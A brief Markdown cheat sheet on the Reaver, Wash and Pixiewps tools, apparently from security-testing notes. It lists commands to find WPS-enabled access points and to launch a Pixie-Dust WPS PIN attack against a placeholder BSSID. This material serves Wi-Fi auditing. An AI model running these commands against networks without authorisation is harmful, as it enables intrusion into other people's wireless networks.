# 🛠️ Tool Master Guide: Reaver, Wash & Pixiewps

> [!INFO] 📋 **Root Metadata**
> - **Category**: Wi-Fi Protected Setup (WPS) Exploitation Tools
> - **Tools Covered**: Reaver, Wash, Pixiewps
> - **Installations**: Pre-installed on Kali Linux (`reaver`, `pixiewps`)
> - **Primary Objective**: Audits Wi-Fi access points for WPS PIN vulnerabilities, executing brute-force and offline Pixie-Dust key recovery attacks.

---

## 💻 1. Operational Workflow

```bash
# 1. Scan network for access points with WPS enabled
sudo wash -i wlan0mon

# 2. Execute Pixie-Dust attack against target WPS BSSID
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
